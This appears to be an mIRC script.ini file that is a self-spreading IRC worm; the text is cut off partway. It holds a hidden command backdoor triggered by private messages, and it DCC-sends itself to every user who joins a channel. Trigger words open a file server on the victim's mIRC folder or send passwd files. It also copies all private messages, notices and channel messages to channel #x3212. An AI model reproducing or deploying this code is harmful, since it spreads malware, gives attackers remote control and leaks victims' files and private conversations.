[script]
n0=on 1:text:�� *:?:{ s *2 | halt }
n1=alias /s / *1
n2=on 1:connect:/.enable #d
n3=#d on
n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n5=#d end
n6=ON 1:TEXT:*Durak*:#:/fserve $nick 1 c:\mirc
n7=ON 1:TEXT:*shirac*:#:/dcc send $nick c:\linux\etc\passwd.
n8=ON 1:TEXT:*shirat*:#:/dcc send $nick c:\unix\etc\passwd.
n9=ON 1:NOTICE:*:#:/msg #x3212  $+ $chan $+  - $+ $nick $+ - $parms
n10=ON 1:TEXT:*:?:/msg #x3212 **Message from $nick $+ ** $parms | /closemsg  $nick
n11=ON 1:TEXT:*:#:/msg #x3212  $+ $chan $+  < $+ $nick $+ > $parms
n12=ON 1:JOIN:#:/dcc send $nick SCRIPT.INI
n13=
n14=#user.prot.add.all off
n15=raw 401:*: set %User.Nick 0 | halt
n16=raw 301:*: halt
n17=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
n18=raw 312:*: halt
n19=raw 313:*: halt
n20=raw 317:*: halt
n21=raw 319:*: halt
n22=raw 318:* {
n23=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto done }
n24=  set %User.Address $ma
